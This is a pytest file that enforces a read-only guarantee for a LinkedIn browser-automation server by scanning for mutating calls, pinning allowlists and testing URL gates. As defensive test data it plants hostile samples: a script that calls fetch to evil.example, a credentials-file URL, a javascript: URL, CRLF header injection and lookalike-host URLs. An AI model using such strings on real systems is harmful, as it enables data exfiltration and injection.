"""The read-only invariant, checked rather than claimed.

Every check here is shown FAILING on a deliberately bad sample before it is
trusted on the real package. A check that cannot fail certifies nothing, and
a read-only guarantee backed by a check that cannot fail is worse than no
guarantee at all -- it manufactures confidence.
"""

from __future__ import annotations

import ast
import re
from pathlib import Path

import pytest

from linkedin_server import dom, readonly
from linkedin_server.errors import WriteAttemptError

PACKAGE_DIR = Path(readonly.__file__).resolve().parent
MODULES = sorted(PACKAGE_DIR.glob("*.py"))


# ---------------------------------------------------------------------------
# 1. No mutating Playwright call anywhere in the package
# ---------------------------------------------------------------------------


def test_there_are_modules_to_scan():
    """Guards against a scan that passes because it found nothing to look at."""
    assert len(MODULES) >= 9, [m.name for m in MODULES]


@pytest.mark.parametrize("module", MODULES, ids=lambda p: p.name)
def test_no_module_contains_an_UNSANCTIONED_mutating_call(module: Path):
    """Every mutating call in the package is one of the ones named in advance.

    THIS CHECK CHANGED SHAPE ON 2026-08-23 AND DID NOT WEAKEN. It used to assert
    the scan came back EMPTY for every module. The package now contains exactly
    one mutating call -- the click in ``writes.perform`` -- so an empty-scan
    assertion could only have been kept by teaching the scanner to stop seeing
    it, which would have destroyed the only instrument that can see the next
    one.

    So the SCAN is untouched and unconditional, and what is asserted is the
    partition: nothing outside ``readonly.SANCTIONED_MUTATIONS``. The tests
    below hold that list to being complete, exact, and narrow.
    """
    source = module.read_text(encoding="utf-8")
    _sanctioned, unsanctioned = readonly.partition_mutation_hits(
        f"linkedin_server/{module.name}", source
    )
    assert unsanctioned == [], (
        f"{module.name} contains calls that could change state and are not "
        f"sanctioned: {unsanctioned}. If the call is genuinely a read, waive "
        "that single line with a trailing '# readonly-ok' so the waiver shows "
        "up in the diff. If it is genuinely a write, it needs an entry in "
        "readonly.SANCTIONED_MUTATIONS and the operator's say-so -- adding "
        "one is the review moment this check exists to create."
    )


def test_the_sanctioned_list_is_exactly_these_two_clicks():
    """The allowlist, read out loud, so widening it is visible in a diff.

    A guard whose allowlist is checked only for "does it cover what we found"
    grows by one entry at a time and nobody notices. This pins the CONTENTS.

    IT GREW BY ONE ON 2026-08-26, from one entry to two, which is precisely
    the event this test exists to make visible. The second is on a READ path,
    which is why it had to argue for itself rather than being waved through:

    * ``writes.perform`` -- the write click, behind the two-call token gate;
    * ``dom.activate_messaging_filter`` -- activates one of seven NAMED filter
      pills on the messaging surface. All six were measured as buttons with no
      href, so that surface is unreachable by navigation. A pill sends nothing
      and changes nothing on LinkedIn's servers, so counted by EFFECT -- which
      is how this family classifies everything -- a view filter is a read. And
      ``linkedin_open_messaging`` already opens somebody's conversation and may
      fire a read receipt: refusing the lesser act while performing the greater
      one is backwards.

    THE COUNT IS STILL PINNED, which is the part that matters. A THIRD click
    fails here whatever its justification, and has to come and write one.
    """
    assert readonly.SANCTIONED_MUTATIONS == (
        ("linkedin_server/writes.py", "perform", "click"),
        ("linkedin_server/dom.py", "activate_messaging_filter", "click"),
    )
    assert len(readonly.SANCTIONED_MUTATIONS) == 2


def test_every_sanctioned_entry_is_actually_present():
    """The other direction: a stale entry is as bad as a missing one.

    An allowlist keyed on a function that no longer exists, or on a call that
    was removed, quietly grants permission to a future edit that recreates the
    name. Both halves are asserted, so the list cannot rot either way.
    """
    found: set[tuple[str, str, str]] = set()
    for module in MODULES:
        rel = f"linkedin_server/{module.name}"
        source = module.read_text(encoding="utf-8")
        for lineno, kind, _line in readonly.scan_source_for_mutations(source):
            found.add((rel, readonly.enclosing_function(source, lineno), kind))
    assert set(readonly.SANCTIONED_MUTATIONS) == found, (
        "the sanctioned list and what the scanner actually finds have "
        f"diverged. list={sorted(readonly.SANCTIONED_MUTATIONS)} "
        f"found={sorted(found)}"
    )


def test_the_package_contains_exactly_as_many_mutating_calls_as_are_listed():
    """COUNT, not just membership -- and this closes a real hole.

    ``test_every_sanctioned_entry_is_actually_present`` compares SETS, so it
    cannot see a duplicate: a SECOND click added inside ``perform`` is the same
    ``(path, function, kind)`` triple as the first and passes a set comparison
    unchanged. That is the hardest case, because it is in the sanctioned file,
    in the sanctioned function, of the sanctioned kind -- and it must still
    fail, because the list admits ONE call and not a licence.

    Shown failing on exactly that edit in
    ``test_writes.py::test_a_second_click_inside_perform_is_still_caught``.
    """
    total = sum(
        len(readonly.scan_source_for_mutations(m.read_text(encoding="utf-8")))
        for m in MODULES
    )
    # TWO from 2026-08-26. The equality against the allowlist LENGTH is the
    # load-bearing half and is unchanged -- an unlisted click still fails --
    # while the literal is what makes growth visible in a diff.
    assert total == len(readonly.SANCTIONED_MUTATIONS) == 2, total


def test_the_partition_conserves_every_hit():
    """Nothing is dropped on the way through the filter.

    The failure this prevents is a partition that quietly swallows a hit --
    which would look identical to a clean package from every caller's side.
    """
    for module in MODULES:
        source = module.read_text(encoding="utf-8")
        sanctioned, unsanctioned = readonly.partition_mutation_hits(
            f"linkedin_server/{module.name}", source
        )
        assert (
            sorted(sanctioned + unsanctioned)
            == sorted(readonly.scan_source_for_mutations(source))
        ), module.name


@pytest.mark.parametrize(
    "label, path, source",
    [
        # The sanctioned call, but in the wrong FILE.
        (
            "wrong file",
            "linkedin_server/dom.py",
            "async def perform(page, grant):\n    await page.click('b')\n",
        ),
        # The sanctioned file and kind, but the wrong FUNCTION.
        (
            "wrong function",
            "linkedin_server/writes.py",
            "async def _helper(page, grant):\n    await page.click('b')\n",
        ),
        # The sanctioned file and function, but the wrong KIND.
        (
            "wrong kind",
            "linkedin_server/writes.py",
            "async def perform(page, grant):\n    await page.fill('#note', 'x')\n",
        ),
        # The sanctioned triple in every respect EXCEPT that the call is
        # buried one scope down. Attribution is innermost, so the closure is
        # named as itself and inherits nothing.
        (
            "nested inside the sanctioned function",
            "linkedin_server/writes.py",
            "async def perform(page, grant):\n"
            "    async def _go():\n"
            "        await page.click('b')\n"
            "    return _go\n",
        ),
        # Module level, inside the sanctioned file. No enclosing function at
        # all, so nothing to match.
        (
            "module level",
            "linkedin_server/writes.py",
            "page.click('b')\n",
        ),
    ],
)
def test_the_exception_does_not_widen(label, path, source):
    """SHOWN FAILING on the five ways this exemption could be stretched.

    Each of these is one edit away from the real entry, and every one of them
    has to come back UNSANCTIONED. Without this the triple could be reduced to
    "a click somewhere in writes.py" and no test would notice.
    """
    sanctioned, unsanctioned = readonly.partition_mutation_hits(path, source)
    assert sanctioned == [], (label, sanctioned)
    assert unsanctioned, (label, "the scanner did not even see it")


def test_the_real_entry_IS_admitted():
    """THE POSITIVE CONTROL for all five refusals above.

    Five tests asserting "not sanctioned" pass perfectly on a partition that
    sanctions nothing at all. This is the one that would fail if it did.
    """
    source = "async def perform(page, grant):\n    await page.click('b')\n"
    sanctioned, unsanctioned = readonly.partition_mutation_hits(
        "linkedin_server/writes.py", source
    )
    assert len(sanctioned) == 1, sanctioned
    assert unsanctioned == []


@pytest.mark.parametrize(
    "spelling",
    [
        "linkedin_server/writes.py",
        "linkedin_server\\writes.py",
        "./linkedin_server/writes.py",
    ],
)
def test_the_path_is_matched_in_every_spelling_a_checkout_produces(spelling):
    """Windows separators and a leading ./ must not silently un-sanction it.

    Three CI cells, two of them posix and one Windows. A path comparison that
    worked on one and not the others would turn this check into a test that
    passes for the wrong reason on two thirds of the matrix.
    """
    source = "async def perform(page, grant):\n    await page.click('b')\n"
    sanctioned, _ = readonly.partition_mutation_hits(spelling, source)
    assert len(sanctioned) == 1, spelling


def test_the_mutation_scanner_catches_a_planted_write():
    """The scanner, shown failing. Without this the check above proves nothing."""
    bad = (
        "async def apply(page):\n"
        "    await page.click('#easy-apply')\n"
        "    await page.fill('#note', 'hire me')\n"
        "    await page.request.post('https://www.linkedin.com/voyager/api/x')\n"
    )
    hits = readonly.scan_source_for_mutations(bad)
    kinds = {kind for _, kind, _ in hits}
    assert {"click", "fill", "http_post"} <= kinds, hits


def test_evaluate_is_flagged_unless_explicitly_waived():
    """An unwaived evaluate() must trip the scanner; a waived one must not."""
    unwaived = "result = await page.evaluate(SOME_SCRIPT)\n"
    assert readonly.scan_source_for_mutations(unwaived)

    waived = "result = await page.evaluate(SOME_SCRIPT)  # readonly-ok\n"
    assert readonly.scan_source_for_mutations(waived) == []


def test_only_dom_module_waives_evaluate():
    """The waiver is a narrow allowance, not a habit spreading through the code."""
    waived_in: dict[str, int] = {}
    for module in MODULES:
        count = sum(
            1
            for line in module.read_text(encoding="utf-8").splitlines()
            if line.strip().endswith("# readonly-ok")
        )
        if count:
            waived_in[module.name] = count
    assert set(waived_in) <= {"dom.py"}, waived_in
    # FOUR FROM 2026-08-26, up from three. The budget is what stops an
    # evaluate() waiver spreading: every one of them is a place where "we
    # only call read methods in Python" stops being a sufficient argument,
    # so the number is pinned and a new one has to move it in a reviewable
    # diff. The fourth is CENSUS_JS, read by dom.read_surface_census.
    assert waived_in.get("dom.py", 0) <= 4, waived_in


# ---------------------------------------------------------------------------
# 2. The injected JavaScript only reads
# ---------------------------------------------------------------------------

INJECTED_SCRIPTS = {
    "HARVEST_LINKED_CARDS_JS": dom.HARVEST_LINKED_CARDS_JS,
    "HARVEST_BLOCK_CARDS_JS": dom.HARVEST_BLOCK_CARDS_JS,
    "READ_PROFILE_JS": dom.READ_PROFILE_JS,
    # 2026-08-26. The surface census reads the CONTROLS on a page rather than
    # its content, which means it is the one script here that goes looking at
    # buttons -- so it is the one whose scan matters most, and it is scanned by
    # exactly the same check as the other three rather than by a special case.
    "CENSUS_JS": dom.CENSUS_JS,
}


def evaluate_targets(source: str) -> list[tuple[str, str, int]]:
    """Return what every ``.evaluate(...)`` in ``source`` is handed, by AST.

    Each entry is ``(kind, value, lineno)`` where kind is ``"name"`` (a
    module-level constant, value is its identifier) or ``"inline"`` (a literal
    string, value is the string itself). An argument that is neither -- an
    f-string, a concatenation, a function call, a variable built at runtime --
    comes back as ``"unresolvable"``, because a script this check cannot read
    is a script it cannot certify.
    """
    out: list[tuple[str, str, int]] = []
    for node in ast.walk(ast.parse(source)):
        if not isinstance(node, ast.Call):
            continue
        func = node.func
        if not (isinstance(func, ast.Attribute) and func.attr.startswith("evaluate")):
            continue
        if not node.args:
            out.append(("unresolvable", "<no argument>", node.lineno))
            continue
        first = node.args[0]
        if isinstance(first, ast.Name):
            out.append(("name", first.id, first.lineno))
        elif isinstance(first, ast.Constant) and isinstance(first.value, str):
            out.append(("inline", first.value, first.lineno))
        else:
            out.append(("unresolvable", type(first).__name__, first.lineno))
    return out


def _scripts_this_package_executes() -> dict[str, str]:
    """The scripts actually reaching ``evaluate``, resolved from the call sites."""
    import importlib

    executed: dict[str, str] = {}
    for module in MODULES:
        targets = evaluate_targets(module.read_text(encoding="utf-8"))
        if not targets:
            continue
        imported = importlib.import_module(f"linkedin_server.{module.stem}")
        for kind, value, lineno in targets:
            label = f"{module.stem}:{lineno}"
            if kind == "inline":
                executed[label] = value
                continue
            if kind == "unresolvable":
                raise AssertionError(
                    f"{module.name}:{lineno} passes {value} to evaluate(). This "
                    "check can only certify a script it can read, so an "
                    "injected script must be a module-level constant or a "
                    "literal."
                )
            script = getattr(imported, value, None)
            assert isinstance(script, str), (
                f"{module.name}:{lineno} passes {value} to evaluate() and it is "
                f"not a module-level string ({type(script).__name__})."
            )
            executed[f"{label} {value}"] = script
    return executed


#: Resolved from the CALL SITES, not from a naming convention. See below.
EXECUTED_SCRIPTS = _scripts_this_package_executes()


@pytest.mark.parametrize("name", sorted(EXECUTED_SCRIPTS))
def test_every_script_this_package_executes_cannot_mutate(name: str):
    """The scan, bound to what RUNS rather than to what is named a certain way.

    The previous version of this check scanned a hand-written dict of three
    names, guarded by a second check that enumerated ``dir(dom)`` for names
    ending in ``_JS``. Both sets happened to coincide, and nothing anywhere
    looked at the first argument of an ``evaluate`` call -- so a script named
    without the suffix could be injected and no test would ever read it. A cold
    review demonstrated exactly that: a constant called ``EVIL_INLINE``,
    carrying ``localStorage.setItem`` and ``fetch(``, passed at the existing
    call site, shipped with the whole suite green.
    """
    found = readonly.scan_js_for_mutations(EXECUTED_SCRIPTS[name])
    assert found == [], f"{name} contains mutating tokens: {found}"


def test_the_scripts_executed_are_exactly_the_ones_declared():
    """No script runs that this module does not know the name of."""
    names = {label.split()[-1] for label in EXECUTED_SCRIPTS if " " in label}
    assert names == set(INJECTED_SCRIPTS), names
    assert len(EXECUTED_SCRIPTS) == 4, sorted(EXECUTED_SCRIPTS)


def test_the_call_site_resolver_sees_a_script_hiding_behind_a_name():
    """The control, and the exact attack the cold review used.

    ``EVIL_INLINE`` does not end in ``_JS``, so the old convention-based check
    was blind to it. The resolver reports it because it reads the call.
    """
    planted = (
        "EVIL_INLINE = \"() => { fetch('https://evil.example/x'); }\"\n"
        "async def read(page):\n"
        "    return await page.evaluate(EVIL_INLINE, cfg)  # readonly-ok\n"
    )
    assert evaluate_targets(planted) == [("name", "EVIL_INLINE", 3)]


def test_the_call_site_resolver_refuses_a_script_it_cannot_read():
    """A script assembled at runtime cannot be certified, so it is rejected."""
    planted = (
        "async def read(page):\n"
        "    return await page.evaluate(BASE + tail())  # readonly-ok\n"
    )
    kinds = {kind for kind, _, _ in evaluate_targets(planted)}
    assert kinds == {"unresolvable"}, evaluate_targets(planted)


def test_the_js_scanner_catches_a_planted_mutation():
    """The JS scanner, shown failing."""
    bad = """
    () => {
      document.querySelector('#apply').click();
      document.querySelector('#note').value = 'hi';
      fetch('/voyager/api/whatever', {method: 'POST'});
    }
    """
    found = readonly.scan_js_for_mutations(bad)
    assert ".click(" in found and ".value =" in found and "fetch(" in found, found


def test_every_injected_script_is_scanned():
    """Catches a fourth script being added to dom.py without a scan."""
    declared = {
        name
        for name in dir(dom)
        if name.endswith("_JS") and isinstance(getattr(dom, name), str)
    }
    assert declared == set(INJECTED_SCRIPTS), declared


# ---------------------------------------------------------------------------
# 3. The navigation allowlist
# ---------------------------------------------------------------------------

ALLOWED = [
    "https://www.linkedin.com/analytics/profile-views/",
    "https://www.linkedin.com/me/profile-views/",
    "https://www.linkedin.com/jobs-tracker/?stage=saved",
    "https://www.linkedin.com/jobs-tracker/?stage=applied",
    # THE THIRD STAGE, allowed 2026-08-26. The tab LinkedIn labels "In
    # Progress" is addressed as ``?stage=draft`` -- the token read off
    # LinkedIn's own anchors in the tracked fixture jobs_tracker_row.html,
    # not guessed from the label, which is a different word.
    "https://www.linkedin.com/jobs-tracker/?stage=draft",
    "https://www.linkedin.com/jobs/search/?keywords=node&f_WT=2",
    "https://www.linkedin.com/in/me/",
    "https://www.linkedin.com/in/alex-r/details/skills/",
    "https://www.linkedin.com/notifications/",
    "https://www.linkedin.com/feed/",
    "https://www.linkedin.com/login",
    # One job posting, addressed by its numeric id and nothing else.
    "https://www.linkedin.com/jobs/view/4600000042",
    "https://www.linkedin.com/jobs/view/4600000042/",
    # HIS OWN MESSAGE SURFACE, allowed 2026-08-26 on the operator's ruling.
    # Both forms, because asking for the first LANDS on the second: LinkedIn
    # redirects /messaging/ into a conversation it chooses, measured twice.
    "https://www.linkedin.com/messaging/",
    "https://www.linkedin.com/messaging/thread/2-abc/",
]

BLOCKED = [
    # Actions on LinkedIn.
    "https://www.linkedin.com/jobs/application/12345",
    # SENDING. The messaging READ surface left this list on 2026-08-26 when
    # the operator ruled that reading his own inbox is his to do; the composer
    # did not, and it is the entry that keeps sending impossible. It is the
    # pre-filled compose overlay LinkedIn opens from a job page.
    "https://www.linkedin.com/messaging/compose/?body=hello&interop=msgOverlay",
    "https://www.linkedin.com/mynetwork/invitation-manager/",
    "https://www.linkedin.com/in/someone/edit/topcard/",
    "https://www.linkedin.com/psettings/open-to-work",
    "https://www.linkedin.com/feed/update/urn:li:activity:123/",
    "https://www.linkedin.com/voyager/api/relationships/invitations",
    "https://www.linkedin.com/notifications/?action=markAllRead",
    # Other people's data at scale, and other hosts entirely.
    "https://www.linkedin.com/search/results/people/?keywords=cto",
    "https://www.linkedin.com/company/acme/people/",
    "https://evil.example.com/steal",
    "http://www.linkedin.com/feed/",
    "javascript:alert(1)",
    "file:///C:/Users/Dell/.claude/.credentials.json",
    "",
    # The job tracker, which the allowlist admits at exactly three addresses.
    # A wildcard query would have let every one of these through.
    "https://www.linkedin.com/jobs-tracker/",
    "https://www.linkedin.com/jobs-tracker/?stage=withdraw",
    "https://www.linkedin.com/jobs-tracker/?stage=archived",
    # The stages LinkedIn's own payload names and this server still refuses,
    # listed since 2026-08-26 because that is the day the enumeration grew and
    # a widening is only narrow if the things it did NOT admit are asserted.
    "https://www.linkedin.com/jobs-tracker/?stage=interview",
    "https://www.linkedin.com/jobs-tracker/?stage=clicked_apply",
    "https://www.linkedin.com/jobs-tracker/?apply=1",
    "https://www.linkedin.com/jobs-tracker/?stage=saved&save=1",
    "https://www.linkedin.com/jobs-tracker/?a%63tion=delete",
    "https://www.linkedin.com/jobs-tracker/?stage=saved#/../messaging/",
    "https://www.linkedin.com.evil.example/jobs-tracker/?stage=saved",
    # The address the tracker replaced. Nothing builds it any more, so it is
    # off the list -- a pattern kept for a url the server never opens is a
    # door with nobody watching it.
    "https://www.linkedin.com/my-items/saved-jobs/?cardType=SAVED",
    # A job posting, at every address this server does NOT build. The tool
    # takes an integer and formats it, so the numeric form is the only one
    # that can ever be produced -- and the pattern permits only that. A slug
    # carries a job title, which is a string, which is the thing an allowlist
    # exists to keep out of a url.
    "https://www.linkedin.com/jobs/view/senior-node-engineer-at-acme-4600000042/",
    "https://www.linkedin.com/jobs/view/4600000042/?refId=abc",
    "https://www.linkedin.com/jobs/view/4600000042/applying",
    "https://www.linkedin.com/jobs/view/12345",
    "https://www.linkedin.com/jobs/view/",
    "https://www.linkedin.com/jobs/view/abc/",
    # Whitespace, which every anchored pattern would otherwise swallow: "$"
    # matches before a trailing newline and "[^#]*" matches a CRLF.
    "https://www.linkedin.com/feed/\n",
    "https://www.linkedin.com/jobs-tracker/?stage=saved\n",
    "https://www.linkedin.com/notifications/?x=1\r\nX: y",
    " https://www.linkedin.com/feed/",
]


def test_the_forbidden_gate_is_what_stops_an_edit_url_not_the_allowlist():
    """Belt and braces, shown to be two separate things.

    ``dom.SKILL_HREF`` matches an inline edit affordance, and the argument that
    it can never become a navigation rests on ``/edit/`` being refused BEFORE
    the allowlist is consulted. Both gates refuse this url, so a test that only
    checked for a raise could not say which -- the message is what distinguishes
    them, and this pins the forbidden one.
    """
    url = "https://www.linkedin.com/in/alex-rivera-8c21/details/skills/edit/forms/2/"
    with pytest.raises(WriteAttemptError) as caught:
        readonly.assert_read_url(url)
    assert "/edit/" in str(caught.value)
    assert "not a read surface" in str(caught.value)


@pytest.mark.parametrize("url", ALLOWED)
def test_read_surfaces_are_allowed(url: str):
    assert readonly.assert_read_url(url) == url


@pytest.mark.parametrize("url", BLOCKED)
def test_write_and_foreign_urls_are_blocked(url: str):
    with pytest.raises(WriteAttemptError):
        readonly.assert_read_url(url)


def test_the_tracker_allowlist_admits_three_stages_and_no_more():
    """THE THIRD STAGE, and the evidence that admitting it stayed narrow.

    ``?stage=draft`` was added on 2026-08-26 so the In Progress list could be
    read at all. The hazard in that edit is not the stage it names -- it is
    the shape the NEXT person reaches for: one ``[a-z_]+`` where the
    alternation is, and every stage LinkedIn has becomes openable, including
    the ones this server has no business on.

    So both halves are pinned. The permitted set is asserted EXACTLY, and each
    refused stage is named rather than left to a wildcard's absence: a test
    that only checked the three permitted ones would pass unchanged against
    ``(saved|applied|draft|interview|archived|clicked_apply)``.
    """
    from linkedin_server.config import BASE_URL

    permitted = {"saved", "applied", "draft"}
    refused = {"interview", "archived", "clicked_apply", "withdraw", "in_progress"}
    assert permitted & refused == set()

    for stage in sorted(permitted):
        url = f"{BASE_URL}/jobs-tracker/?stage={stage}"
        assert readonly.is_read_url(url), stage

    for stage in sorted(refused):
        url = f"{BASE_URL}/jobs-tracker/?stage={stage}"
        assert not readonly.is_read_url(url), stage

    # SHOWN NOT PASSING VACUOUSLY, which for a refusal test is the whole
    # question. Every refused url above matches the wildcard somebody might
    # reach for, so the ENUMERATION is the only thing standing between this
    # server and all five -- and the loop above is what fails on the day it
    # stops being an enumeration.
    wildcard = re.compile(r"^https://www\.linkedin\.com/jobs-tracker/\?stage=[a-z_]+$")
    for stage in sorted(refused):
        assert wildcard.match(f"{BASE_URL}/jobs-tracker/?stage={stage}"), stage


def test_a_keyword_cannot_smuggle_a_forbidden_path_into_a_search_url():
    """Tool arguments reach the url builder; the allowlist is what stops them."""
    hostile = (
        "https://www.linkedin.com/jobs/search/?keywords=x"
        "#/../messaging/thread/2-abc/"
    )
    # The fragment cannot escape the allowlist pattern, which is anchored.
    with pytest.raises(WriteAttemptError):
        readonly.assert_read_url(hostile)


# ---------------------------------------------------------------------------
# 4. Every url the server builds is a permitted read surface
# ---------------------------------------------------------------------------


def test_the_urls_the_server_actually_builds_all_pass_the_allowlist():
    from linkedin_server.config import BASE_URL, FEED_URL, LOGIN_URL

    built = [
        f"{BASE_URL}/analytics/profile-views/",
        f"{BASE_URL}/me/profile-views/",
        f"{BASE_URL}/jobs-tracker/?stage=applied",
        f"{BASE_URL}/jobs-tracker/?stage=saved",
        f"{BASE_URL}/jobs-tracker/?stage=draft",
        f"{BASE_URL}/in/me/",
        f"{BASE_URL}/in/alex-r/details/skills/",
        f"{BASE_URL}/notifications/",
        FEED_URL,
        LOGIN_URL,
    ]
    for url in built:
        assert readonly.is_read_url(url), url


def test_that_list_is_the_urls_the_server_really_builds():
    """The list above is hand-written, so it can go stale -- and it did.

    It still named ``/my-items/saved-jobs/?cardType=...`` for a release after
    the server stopped building it, and never named the tracker urls that
    replaced them, so the one line this change added to the allowlist was
    covered by nothing. This reads the f-string literals out of ``server.py``
    instead of trusting the list.
    """
    source = (Path(readonly.__file__).resolve().parent / "server.py").read_text(
        encoding="utf-8"
    )
    built_paths = set(re.findall(r'f"\{BASE_URL\}(/[^"?]*)', source))
    assert "/jobs-tracker/" in built_paths, built_paths
    assert "/my-items/saved-jobs/" not in built_paths, (
        "server.py still builds the retired saved-jobs url"
    )
